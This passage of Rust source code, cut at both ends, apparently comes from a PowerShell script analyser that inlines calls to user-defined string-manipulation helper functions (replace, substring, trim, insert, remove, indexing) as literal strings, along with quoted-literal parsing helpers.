        chars.drain(start_index..end_index);
        let replacement: String = chars.into_iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_insert_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_binding: &PsLiteralArgBinding,
    insert_binding: &PsLiteralArgBinding,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(start_index) =
            ps_literal_arg_by_name_or_position(&args, &start_binding.name, start_binding.position)
                .and_then(ps_literal_arg_as_integer)
        else {
            search_from = call_end;
            continue;
        };
        let Some(insertion) = ps_literal_arg_by_name_or_position(
            &args,
            &insert_binding.name,
            insert_binding.position,
        )
        .and_then(ps_literal_arg_as_string) else {
            search_from = call_end;
            continue;
        };
        let mut chars: Vec<char> = value.chars().collect();
        if start_index > chars.len() {
            search_from = call_end;
            continue;
        }
        chars.splice(start_index..start_index, insertion.chars());
        let replacement: String = chars.into_iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_trim_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    chars_binding: &PsLiteralArgBinding,
    mode: PsTrimMode,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(chars) =
            ps_literal_arg_by_name_or_position(&args, &chars_binding.name, chars_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let replacement = mode.apply(value, chars).replace('\'', "''");
        matches.push((start, call_end, format!("'{replacement}'")));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_trim_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    chars: &str,
    mode: PsTrimMode,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let replacement = mode.apply(value, chars).replace('\'', "''");
        matches.push((start, call_end, format!("'{replacement}'")));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_case_extractor_calls(
    text: &str,
    name: &str,
    value_position: usize,
    lower: bool,
) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(PsLiteralCallArg::String(value)) = args.get(value_position) else {
            search_from = call_end;
            continue;
        };
        let replacement = if lower {
            value.to_lowercase()
        } else {
            value.to_uppercase()
        };
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_index_extractor_calls(
    text: &str,
    name: &str,
    value_position: usize,
    index_position: usize,
) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(PsLiteralCallArg::String(value)) = args.get(value_position) else {
            search_from = call_end;
            continue;
        };
        let Some(PsLiteralCallArg::Integer(index)) = args.get(index_position) else {
            search_from = call_end;
            continue;
        };
        let Some(ch) = value.chars().nth(*index) else {
            search_from = call_end;
            continue;
        };
        let replacement = if ch == ' ' {
            PS_LITERAL_SPACE_SENTINEL.to_string()
        } else {
            ch.to_string().replace('\'', "''")
        };
        matches.push((start, call_end, format!("'{replacement}'")));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_index_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    index: usize,
) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(ch) = value.chars().nth(index) else {
            search_from = call_end;
            continue;
        };
        let replacement = if ch == ' ' {
            PS_LITERAL_SPACE_SENTINEL.to_string()
        } else {
            ch.to_string().replace('\'', "''")
        };
        matches.push((start, call_end, format!("'{replacement}'")));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_remove_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_index: usize,
    count: usize,
) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let mut chars: Vec<char> = value.chars().collect();
        let end_index = start_index.saturating_add(count);
        if start_index > chars.len() || end_index > chars.len() {
            search_from = call_end;
            continue;
        }
        chars.drain(start_index..end_index);
        let replacement: String = chars.into_iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_insert_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_index: usize,
    insertion: &str,
) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let mut chars: Vec<char> = value.chars().collect();
        if start_index > chars.len() {
            search_from = call_end;
            continue;
        }
        chars.splice(start_index..start_index, insertion.chars());
        let replacement: String = chars.into_iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_literal_replace_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "replace")
    {
        return text.to_string();
    }
    let mut defs: Vec<(
        String,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
    )> = Vec::new();
    let mut const_defs: Vec<(String, PsLiteralArgBinding, String, String)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        defs.extend(
            LITERAL_REPLACE_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .chain(LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE.captures_iter(block))
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                    ))
                }),
        );
        const_defs.extend(
            LITERAL_CONST_DOT_REPLACE_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .chain(LITERAL_CONST_DASH_REPLACE_EXTRACTOR_DEF_RE.captures_iter(block))
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        caps.get(4)?.as_str().replace("''", "'"),
                        caps.get(5)?.as_str().replace("''", "'"),
                    ))
                }),
        );
    });
    if defs.is_empty() && const_defs.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, value_binding, needle_binding, replacement_binding) in defs {
        out = inline_ps_literal_replace_extractor_calls(
            &out,
            &name,
            &value_binding,
            &needle_binding,
            &replacement_binding,
        );
    }
    for (name, value_binding, needle, replacement_arg) in const_defs {
        out = inline_ps_literal_const_replace_extractor_calls(
            &out,
            &name,
            &value_binding,
            &needle,
            &replacement_arg,
        );
    }
    out
}

fn expand_literal_substring_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "substring")
    {
        return text.to_string();
    }
    let mut defs: Vec<(
        String,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
    )> = Vec::new();
    let mut tail_defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding)> = Vec::new();
    let mut const_defs: Vec<(String, PsLiteralArgBinding, usize, usize)> = Vec::new();
    scan_ps_function_blocks(text, |window| {
        defs.extend(
            LITERAL_SUBSTRING_EXTRACTOR_DEF_RE
                .captures_iter(window)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                    ))
                }),
        );
        tail_defs.extend(
            LITERAL_TAIL_SUBSTRING_EXTRACTOR_DEF_RE
                .captures_iter(window)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
                    ))
                }),
        );
        const_defs.extend(
            LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE
                .captures_iter(window)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        caps.get(4)?.as_str().parse().ok()?,
                        caps.get(5)?.as_str().parse().ok()?,
                    ))
                }),
        );
    });
    if defs.is_empty() && tail_defs.is_empty() && const_defs.is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
    for (name, value_binding, start_binding, count_binding) in defs {
        out = inline_ps_literal_substring_extractor_calls(
            &out,
            &name,
            &value_binding,
            &start_binding,
            &count_binding,
        );
    }
    for (name, value_binding, start_binding) in tail_defs {
        out = inline_ps_literal_tail_substring_extractor_calls(
            &out,
            &name,
            &value_binding,
            &start_binding,
        );
    }
    for (name, value_binding, start_index, count) in const_defs {
        out = inline_ps_literal_const_substring_extractor_calls(
            &out,
            &name,
            &value_binding,
            start_index,
            count,
        );
    }
    out
}

fn expand_literal_trim_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "trim")
    {
        return text.to_string();
    }
    let mut defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding, PsTrimMode)> = Vec::new();
    let mut const_defs: Vec<(String, PsLiteralArgBinding, String, PsTrimMode)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        defs.extend(
            LITERAL_TRIM_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .chain(LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE.captures_iter(block))
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                        PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                    ))
                }),
        );
        const_defs.extend(
            LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        caps.get(5)?.as_str().replace("''", "'"),
                        PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                    ))
                }),
        );
    });
    defs.extend(
        LITERAL_ITEM_PATH_TRIM_EXTRACTOR_DEF_RE
            .captures_iter(text)
            .chain(LITERAL_ITEM_NAME_TRIM_EXTRACTOR_DEF_RE.captures_iter(text))
            .filter_map(|caps| {
                let name = caps.get(1)?.as_str();
                let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                Some((
                    name.to_string(),
                    ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                    ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                    PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                ))
            }),
    );
    let mut out = text.to_string();
    for (name, value_binding, chars_binding, mode) in defs {
        out = inline_ps_literal_trim_extractor_calls(
            &out,
            &name,
            &value_binding,
            &chars_binding,
            mode,
        );
    }
    for (name, value_binding, chars, mode) in const_defs {
        out =
            inline_ps_literal_const_trim_extractor_calls(&out, &name, &value_binding, &chars, mode);
    }
    out
}

fn expand_literal_case_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || (!contains_ascii_case_insensitive(text, "tolower")
            && !contains_ascii_case_insensitive(text, "toupper"))
    {
        return text.to_string();
    }
    let mut defs: Vec<(String, usize, bool)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        defs.extend(
            LITERAL_CASE_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    let value_param = caps.get(3)?.as_str();
                    let value_position = params
                        .iter()
                        .position(|param| param.eq_ignore_ascii_case(value_param))?;
                    Some((
                        name.to_string(),
                        value_position,
                        caps.get(4)?.as_str().eq_ignore_ascii_case("Lower"),
                    ))
                }),
        );
    });
    let mut out = text.to_string();
    for (name, value_position, lower) in defs {
        out = inline_ps_literal_case_extractor_calls(&out, &name, value_position, lower);
    }
    out
}

fn parse_ps_parameter_names(params: &str) -> Vec<String> {
    params
        .split(',')
        .filter_map(|param| {
            let cleaned = param
                .trim()
                .trim_start_matches('[')
                .split(']')
                .next_back()
                .unwrap_or(param)
                .trim()
                .trim_start_matches('$');
            if cleaned
                .chars()
                .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
                && !cleaned.is_empty()
            {
                Some(cleaned.to_ascii_lowercase())
            } else {
                None
            }
        })
        .collect()
}

fn ps_literal_arg_binding(params: &[String], name: &str) -> Option<PsLiteralArgBinding> {
    let name = name.to_ascii_lowercase();
    let position = params
        .iter()
        .position(|param| param.eq_ignore_ascii_case(&name))?;
    Some(PsLiteralArgBinding { name, position })
}

fn expand_literal_index_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || (!text.contains('[')
            && !contains_ascii_case_insensitive(text, "chars")
            && !contains_ascii_case_insensitive(text, "tochararray"))
    {
        return text.to_string();
    }
    let mut defs: Vec<(String, usize, usize)> = Vec::new();
    let mut const_defs: Vec<(String, PsLiteralArgBinding, usize)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        defs.extend(
            LITERAL_INDEX_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    let value_param = caps.get(3)?.as_str().to_ascii_lowercase();
                    let index_param = caps
                        .get(4)
                        .or_else(|| caps.get(5))
                        .or_else(|| caps.get(6))?
                        .as_str()
                        .to_ascii_lowercase();
                    let value_position = params
                        .iter()
                        .position(|param| param.eq_ignore_ascii_case(&value_param))?;
                    let index_position = params
                        .iter()
                        .position(|param| param.eq_ignore_ascii_case(&index_param))?;
                    Some((name.to_string(), value_position, index_position))
                }),
        );
        const_defs.extend(
            LITERAL_CONST_INDEX_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    let index = caps
                        .get(4)
                        .or_else(|| caps.get(5))
                        .or_else(|| caps.get(6))?
                        .as_str()
                        .parse()
                        .ok()?;
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        index,
                    ))
                }),
        );
    });
    let mut out = text.to_string();
    for (name, value_position, index_position) in defs {
        out = inline_ps_literal_index_extractor_calls(&out, &name, value_position, index_position);
    }
    for (name, value_binding, index) in const_defs {
        out = inline_ps_literal_const_index_extractor_calls(&out, &name, &value_binding, index);
    }
    out
}

fn expand_literal_remove_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "remove")
    {
        return text.to_string();
    }
    let mut variable_defs: Vec<(
        String,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
        Option<PsLiteralArgBinding>,
    )> = Vec::new();
    let mut defs: Vec<(String, PsLiteralArgBinding, usize, usize)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        variable_defs.extend(
            LITERAL_REMOVE_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
                        caps.get(5)
                            .and_then(|m| ps_literal_arg_binding(&params, m.as_str())),
                    ))
                }),
        );
        defs.extend(
            LITERAL_CONST_REMOVE_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        caps.get(4)?.as_str().parse().ok()?,
                        caps.get(5)?.as_str().parse().ok()?,
                    ))
                }),
        );
    });
    let mut out = text.to_string();
    for (name, value_binding, start_binding, count_binding) in variable_defs {
        out = inline_ps_literal_remove_extractor_calls(
            &out,
            &name,
            &value_binding,
            &start_binding,
            count_binding.as_ref(),
        );
    }
    for (name, value_binding, start_index, count) in defs {
        out = inline_ps_literal_const_remove_extractor_calls(
            &out,
            &name,
            &value_binding,
            start_index,
            count,
        );
    }
    out
}

fn expand_literal_insert_extractor_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "insert")
    {
        return text.to_string();
    }
    let mut variable_defs: Vec<(
        String,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
        PsLiteralArgBinding,
    )> = Vec::new();
    let mut defs: Vec<(String, PsLiteralArgBinding, usize, String)> = Vec::new();
    scan_ps_function_blocks(text, |block| {
        variable_defs.extend(
            LITERAL_INSERT_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
                        ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
                    ))
                }),
        );
        defs.extend(
            LITERAL_CONST_INSERT_EXTRACTOR_DEF_RE
                .captures_iter(block)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str();
                    let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                    Some((
                        name.to_string(),
                        ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
                        caps.get(4)?.as_str().parse().ok()?,
                        caps.get(5)?.as_str().replace("''", "'"),
                    ))
                }),
        );
    });
    let mut out = text.to_string();
    for (name, value_binding, start_binding, insert_binding) in variable_defs {
        out = inline_ps_literal_insert_extractor_calls(
            &out,
            &name,
            &value_binding,
            &start_binding,
            &insert_binding,
        );
    }
    for (name, value_binding, start_index, insertion) in defs {
        out = inline_ps_literal_const_insert_extractor_calls(
            &out,
            &name,
            &value_binding,
            start_index,
            &insertion,
        );
    }
    out
}

fn restore_ps_literal_space_sentinels(text: &str) -> String {
    if !text.contains(PS_LITERAL_SPACE_SENTINEL) {
        return text.to_string();
    }
    text.replace(PS_LITERAL_SPACE_SENTINEL, " ")
}

fn expand_passthrough_call_wrappers(text: &str) -> String {
    if !contains_potential_passthrough_call_wrapper(text) {
        return text.to_string();
    }
    let defs: Vec<(String, String)> = PASSTHROUGH_CALL_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps
                .get(1)
                .or_else(|| caps.get(3))
                .map(|m| m.as_str().to_string())?;
            let target = caps.get(4)?.as_str().to_string();
            let param = caps.get(2).or_else(|| caps.get(5))?.as_str();
            let body_param = caps.get(5)?.as_str();
            if !param.eq_ignore_ascii_case(body_param) || !is_ps_command_atom(&target) {
                return None;
            }
            if target.eq_ignore_ascii_case("invoke-expression")
                || target.eq_ignore_ascii_case("iex")
            {
                return None;
            }
            Some((name, target))
        })
        .collect();
    if defs.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, target) in defs {
        out = inline_ps_literal_calls_to_target(&out, &name, &target);
    }

    out
}

fn contains_potential_passthrough_call_wrapper(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut idx = 0usize;
    while idx < bytes.len() {
        let Some(rel) = bytes[idx..].iter().position(|b| *b == b'&') else {
            break;
        };
        let mut pos = idx + rel + 1;
        while let Some(b) = bytes.get(pos) {
            match b {
                b' ' | b'\t' | b'\r' | b'\n' => pos += 1,
                b'(' => {
                    pos += 1;
                    while let Some(b) = bytes.get(pos) {
                        match b {
                            b' ' | b'\t' | b'\r' | b'\n' => pos += 1,
                            b'\'' => return true,
                            _ => break,
                        }
                    }
                    break;
                }
                b'\'' => return true,
                _ => break,
            }
        }
        idx = pos.saturating_add(1).min(bytes.len());
    }
    false
}

fn inline_ps_literal_calls(text: &str, name: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let mut pos = skip_ascii_ws(bytes, end_name);
        let parenthesized = bytes.get(pos) == Some(&b'(');
        if parenthesized {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'\'') {
            search_from = end_name;
            continue;
        }
        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
            search_from = end_name;
            continue;
        };
        let mut call_end = literal_end;
        if parenthesized {
            let after = skip_ascii_ws(bytes, call_end);
            if bytes.get(after) != Some(&b')') {
                search_from = end_name;
                continue;
            }
            call_end = after + 1;
        }
        matches.push((start, call_end, value));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn is_ident_byte(byte: Option<u8>) -> bool {
    byte.is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
}

fn skip_ascii_ws(bytes: &[u8], mut pos: usize) -> usize {
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    pos
}

fn next_char_at(text: &str, pos: usize) -> Option<(char, usize)> {
    let byte = *text.as_bytes().get(pos)?;
    if byte.is_ascii() {
        Some((byte as char, 1))
    } else {
        let ch = text[pos..].chars().next()?;
        Some((ch, ch.len_utf8()))
    }
}

fn parse_ps_single_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    if bytes.get(start).copied() != Some(b'\'') {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < bytes.len() {
        let byte = bytes[pos];
        if byte == b'\'' {
            if bytes.get(pos + 1).copied() == Some(b'\'') {
                out.push('\'');
                pos += 2;
                continue;
            }
            return Some((pos + 1, out));
        }
        if byte.is_ascii() {
            out.push(byte as char);
            pos += 1;
            continue;
        }
        let (ch, ch_len) = next_char_at(text, pos)?;
        out.push(ch);
        pos += ch_len;
    }
    None
}

fn parse_ps_double_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    if bytes.get(start).copied() != Some(b'"') {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < bytes.len() {
        let byte = bytes[pos];
        if byte == b'"' {
            return Some((pos + 1, out));
        }
        if byte == b'`' {
            let escaped = *bytes.get(pos + 1)?;
            out.push(escaped as char);
            pos += 2;
            continue;
        }
        if byte == b'$' {
            return None;
        }
        if byte.is_ascii() {
            out.push(byte as char);
            pos += 1;
            continue;
        }
        let (ch, ch_len) = next_char_at(text, pos)?;
        out.push(ch);
        pos += ch_len;
    }
    None
}

fn parse_ps_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    parse_ps_single_quoted_literal(text, start)
        .or_else(|| parse_ps_double_quoted_literal(text, start))
}

fn next_ps_quoted_literal(text: &str, start: usize) -> Option<(usize, usize, String)> {
    let mut idx = start;
    while idx < text.len() {
        let rel = text[idx..].find(['\'', '"'])?;
        let literal_start = idx + rel;
        if let Some((end, value)) = parse_ps_quoted_literal(text, literal_start) {
            return Some((literal_start, end, value));
        }
        idx = literal_start + 1;
    }
    None
}

fn ps_capture_string(
    caps: &regex::Captures<'_>,
    single_idx: usize,
    double_idx: usize,
) -> Option<String> {
    caps.get(single_idx)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| {
            caps.get(double_idx)
                .map(|m| m.as_str().replace("`\"", "\""))
        })
}

fn normalize_simple_ps_split_separator(separator: &str) -> String {
    let mut out = String::new();
    let mut escaped = false;
    for ch in separator.chars() {
        if escaped {
            out.push(ch);
            escaped = false;
        } else if ch == '\\' {
            escaped = true;
        } else {
